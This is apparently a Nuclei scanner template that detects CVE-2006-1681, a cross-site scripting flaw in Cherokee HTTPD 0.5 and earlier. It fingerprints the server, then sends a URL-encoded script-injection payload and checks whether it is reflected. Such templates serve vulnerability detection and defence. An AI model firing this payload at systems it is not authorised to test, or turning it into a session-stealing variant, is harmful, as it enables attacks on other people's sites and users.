id: CVE-2006-1681

info:
  name: Cherokee HTTPD <=0.5 - Cross-Site Scripting
  author: geeknik
  severity: medium
  description: Cherokee HTTPD 0.5 and earlier contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via a malformed request that generates an HTTP 400 error, which is not properly handled when the error message is generated.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of Cherokee HTTPD or apply the necessary security patches to mitigate the XSS vulnerability.
  reference:
    - http://www.vupen.com/english/advisories/2006/1292
    - https://nvd.nist.gov/vuln/detail/CVE-2006-1681
    - https://exchange.xforce.ibmcloud.com/vulnerabilities/25698
    - https://security.gentoo.org/glsa/202012-09
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cve-id: CVE-2006-1681
    cwe-id: NVD-CWE-Other
    epss-score: 0.00286
    epss-percentile: 0.51865
    cpe: cpe:2.3:a:cherokee:cherokee_httpd:0.1:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: cherokee
    product: cherokee_httpd
  tags: cve,cve2006,cherokee,httpd,xss

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    host-redirects: true
    max-redirects: 2
    matchers:
      - type: word
        words:
          - "Cherokee"
        case-insensitive: true
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 490a0046304402205471b1ff22c7477bc6882f670e3ee625eb410ca2b066e93fc40b9a49fc0fbfda02204a356c53b1a7bfcc6700a3f245431d9577c670848200e57d520e0dda6c8527db:922c64590222798bb761d5b6d8e72950